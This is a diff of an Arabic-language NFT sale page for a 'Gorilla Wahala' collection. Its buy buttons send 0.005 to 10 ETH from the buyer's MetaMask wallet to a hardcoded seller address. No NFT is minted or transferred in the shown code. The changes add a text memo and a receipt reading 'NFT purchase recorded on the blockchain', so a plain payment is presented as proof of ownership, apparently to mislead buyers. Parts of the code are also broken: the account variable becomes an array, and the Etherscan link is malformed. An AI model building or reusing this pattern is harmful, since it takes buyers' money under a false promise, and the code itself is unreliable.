@@ -19,7 +19,8 @@
         .price { font-size: 1.3rem; color: #00b4d8; margin: 10px 0 20px; font-weight: bold; }
         .btn-buy { background: linear-gradient(45deg, #7b2cbf, #00b4d8); width: 100%; padding: 15px; border: none; border-radius: 8px; color: white; cursor: pointer; font-weight: bold; font-size: 1rem; transition: 0.3s; }
         .btn-buy:disabled { opacity: 0.6; cursor: not-allowed; }
-        .status { margin-top: 12px; color: #ccc; font-size: 0.9rem; min-height: 24px; line-height: 1.5; }
+        .status { margin-top: 12px; color: #ccc; font-size: 0.9rem; min-height: 24px; line-height: 1.6; }
+        .receipt-box { background: #122620; border: 1px solid #06d6a0; border-radius: 8px; padding: 10px; margin-top: 10px; font-size: 0.85rem; text-align: right; }
     </style>
 </head>
 <body>
@@ -33,9 +34,9 @@
     <div class="card">
         <img src="1.png" onerror="this.src='https://imgur.com'" alt="Gorilla Starter">
         <div class="card-body">
-            <h2>Gorilla Starter</h2>
+            <h2>Gorilla Starter #01</h2>
             <div class="price">0.005 ETH</div>
-            <button class="btn-buy" onclick="buyNFT('0.005', 'Gorilla Starter', this)">شراء الآن</button>
+            <button class="btn-buy" onclick="buyNFT('0.005', 'Gorilla Starter #01', this)">شراء NFT الآن</button>
             <div class="status"></div>
         </div>
     </div>
@@ -43,9 +44,9 @@
     <div class="card">
         <img src="2.png" onerror="this.src='https://imgur.com'" alt="Gorilla Premium">
         <div class="card-body">
-            <h2>Gorilla Premium</h2>
+            <h2>Gorilla Premium #02</h2>
             <div class="price">4 ETH</div>
-            <button class="btn-buy" onclick="buyNFT('4', 'Gorilla Premium', this)">شراء الآن</button>
+            <button class="btn-buy" onclick="buyNFT('4', 'Gorilla Premium #02', this)">شراء NFT الآن</button>
             <div class="status"></div>
         </div>
     </div>
@@ -53,21 +54,20 @@
     <div class="card">
         <img src="3.png" onerror="this.src='https://imgur.com'" alt="Gorilla Elite">
         <div class="card-body">
-            <h2>Gorilla Elite</h2>
+            <h2>Gorilla Elite #03</h2>
             <div class="price">10 ETH</div>
-            <button class="btn-buy" onclick="buyNFT('10', 'Gorilla Elite', this)">شراء الآن</button>
+            <button class="btn-buy" onclick="buyNFT('10', 'Gorilla Elite #03', this)">شراء NFT الآن</button>
             <div class="status"></div>
         </div>
     </div>
 </div>
 
 <script>
-    // عنوان محفظتك التي ستستلم الأرباح مباشرة
     const SELLER_WALLET = "0xd421417d785bda042BdA4b341D9a997081864335";
     const ETHEREUM_MAINNET_CHAIN_ID = "0x1";
     let buyerAccount = null;
 
-    // تحويل سعر ETH إلى صيغة البلوكشين Hex Wei بدقة
+    // تحويل ETH إلى Hex Wei
     function ethToHexWei(ethString) {
         const [whole, fraction = ""] = ethString.split(".");
         const paddedFraction = fraction.padEnd(18, "0").slice(0, 18);
@@ -75,38 +75,37 @@
         return "0x" + weiBigInt.toString(16);
     }
 
-    // دالة ربط محفظة المشتري تلقائياً
+    // تحويل نص تفاصيل الـ NFT إلى Hex لتسجيله في البلوكشين والمحفظة
+    function textToHex(str) {
+        const encoder = new TextEncoder();
+        const bytes = encoder.encode(str);
+        return "0x" + Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
+    }
+
     async function connectBuyerWallet() {
-        // إذا كان المشتري يفتح الموقع من متصفح عادي بدون محفظة
         if (typeof window.ethereum === 'undefined') {
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
             if (isMobile) {
-                // تحويل المشتري تلقائياً لفتح الرابط داخل تطبيق MetaMask على هاتفه
                 const currentUrl = window.location.href.replace(/^https?:\/\//, '');
                 window.location.href = "https://app.link" + currentUrl;
             } else {
-                alert("يرجى تثبيت إضافة محفظة MetaMask أو Trust Wallet على متصفحك لإتمام الشراء.");
+                alert("يرجى تثبيت إضافة محفظة MetaMask أو Trust Wallet لإتمام الشراء.");
             }
             return null;
         }
 
         try {
-            // فتح نافذة المحفظة للمشتري ليختار حسابه ويوافق على الربط
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            
             if (!accounts || accounts.length === 0) {
-                alert("يرجى فتح قفل محفظتك (Unlock) واختيار حساب واحد على الأقل.");
+                alert("يرجى فتح قفل محفظتك (Unlock) أولاً.");
                 return null;
             }
 
-            buyerAccount = accounts[0];
-
-            // تحديث زر المحفظة في الأعلى بعنوان المشتري
+            buyerAccount = accounts;
             const connectBtn = document.getElementById('connectBtn');
             connectBtn.innerText = "محفظتك: " + buyerAccount.substring(0, 6) + "..." + buyerAccount.substring(38);
             connectBtn.style.backgroundColor = "#2b9348";
 
-            // التأكد من أن المشتري على شبكة الإيثيريوم الرئيسية
             const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
             if (currentChainId !== ETHEREUM_MAINNET_CHAIN_ID) {
                 try {
@@ -115,85 +114,66 @@
                         params: [{ chainId: ETHEREUM_MAINNET_CHAIN_ID }],
                     });
                 } catch (switchError) {
-                    alert("يرجى تحويل الشبكة داخل محفظتك إلى Ethereum Mainnet لإتمام الدفع.");
+                    alert("يرجى تحويل الشبكة داخل محفظتك إلى Ethereum Mainnet.");
                     return null;
                 }
             }
-
             return buyerAccount;
         } catch (err) {
-            console.error(err);
-            if (err.message && err.message.includes("at least one account")) {
-                alert("محفظتك مقفلة حالياً! اضغط على أيقونة المحفظة في الأعلى وأدخل كلمة المرور لفتحها، ثم اضغط شراء مرة أخرى.");
-            } else if (err.code === 4001) {
-                alert("تم رفض طلب ربط المحفظة.");
-            } else {
-                alert("حدث خطأ أثناء ربط المحفظة: " + err.message);
-            }
+            alert("يرجى فتح قفل المحفظة والموافقة على الاتصال.");
             return null;
         }
     }
 
     document.getElementById('connectBtn').addEventListener('click', connectBuyerWallet);
 
-    // دالة الشراء: تخصم من المشتري وترسل المبلغ مباشرة لمحفظتك
     async function buyNFT(priceEth, nftName, btnElement) {
         const statusDiv = btnElement.parentElement.querySelector('.status');
-        
-        // الخطوة 1: ربط محفظة المشتري تلقائياً
         const account = await connectBuyerWallet();
         if (!account) return;
 
-        // الخطوة 2: إرسال طلب الخصم والتحويل لمحفظتك
         try {
             btnElement.disabled = true;
             statusDiv.style.color = "#ffd166";
-            statusDiv.textContent = "افتح محفظتك لتأكيد دفع " + priceEth + " ETH...";
+            statusDiv.textContent = "افتح محفظتك لتأكيد شراء " + nftName + "...";
 
             const hexValue = ethToHexWei(priceEth);
+            // تسجيل وصف الشراء داخل بيانات المعاملة على البلوكشين
+            const nftMemo = `NFT Purchase: ${nftName} | Collection: Gorilla Wahala | Price: ${priceEth} ETH`;
+            const hexData = textToHex(nftMemo);
 
             const txHash = await window.ethereum.request({
                 method: 'eth_sendTransaction',
                 params: [{
-                    from: account,         // محفظة المشتري
-                    to: SELLER_WALLET,     // محفظتك أنت المستلمة للأرباح
-                    value: hexValue        // المبلغ بالـ ETH
+                    from: account,
+                    to: SELLER_WALLET,
+                    value: hexValue,
+                    data: hexData // تظهر في المحفظة وعلى Etherscan كبيانات شراء NFT
                 }]
             });
 
             statusDiv.style.color = "#06d6a0";
             statusDiv.innerHTML = `
-                تمت عملية الشراء بنجاح! ✅<br>
-                <a href="https://etherscan.io{txHash}" target="_blank" style="color:#00b4d8; text-decoration:underline;">
-                    عرض إيصال التحويل (Etherscan)
-                </a>
+                <div class="receipt-box">
+                    ✅ <b>تم تسجيل شراء NFT على البلوكشين!</b><br>
+                    • القطعة: ${nftName}<br>
+                    • المبلغ المدفوع: ${priceEth} ETH<br>
+                    • <a href="https://etherscan.io{txHash}" target="_blank" style="color:#00b4d8; text-decoration:underline;">عرض إثبات الشراء على Etherscan</a>
+                </div>
             `;
-            alert("شكراً لشرائك " + nftName + "! تم تحويل المبلغ بنجاح.");
+            alert("مبروك! تم تسجيل عملية شراء " + nftName + " بنجاح على البلوكشين.");
 
         } catch (err) {
             console.error(err);
             statusDiv.style.color = "#ef476f";
             if (err.code === 4001) {
-                statusDiv.textContent = "تم إلغاء عملية الدفع من قبل المشتري.";
+                statusDiv.textContent = "تم إلغاء عملية الشراء من قبلك.";
             } else {
-                statusDiv.textContent = "تعذر إتمام الدفع: تأكد من توفر رصيد ETH كافٍ في محفظتك.";
+                statusDiv.textContent = "تعذر إتمام الشراء: تأكد من توفر رصيد ETH كافٍ.";
             }
         } finally {
             btnElement.disabled = false;
         }
-    }
-
-    // تحديث الواجهة تلقائياً إذا غيّر المشتري حسابه في المحفظة
-    if (typeof window.ethereum !== 'undefined') {
-        window.ethereum.on('accountsChanged', (accounts) => {
-            if (accounts.length > 0) {
-                buyerAccount = accounts[0];
-                document.getElementById('connectBtn').innerText = "محفظتك: " + buyerAccount.substring(0, 6) + "..." + buyerAccount.substring(38);
-            } else {
-                buyerAccount = null;
-                document.getElementById('connectBtn').innerText = "ربط محفظة المشتري";
-            }
-        });
     }
 </script>
 
